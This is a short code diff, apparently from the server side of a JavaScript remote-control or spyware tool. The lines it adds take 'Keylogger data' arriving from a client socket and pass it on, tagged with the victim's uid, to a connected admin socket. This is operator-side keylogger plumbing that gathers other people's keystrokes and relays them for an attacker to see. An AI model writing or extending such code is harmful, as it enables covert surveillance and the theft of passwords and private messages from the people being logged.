@@ -150,6 +150,8 @@ function handleUserData(socket) {
             console.log("Already parsed");
         }
         console.log("Keylogger data---->> ", data);
+        if (adminSocket != null && adminSocket.connected)
+            adminSocket.emit('keyLog', {data: data.data, uid: socket.tag});
     });
 
 }
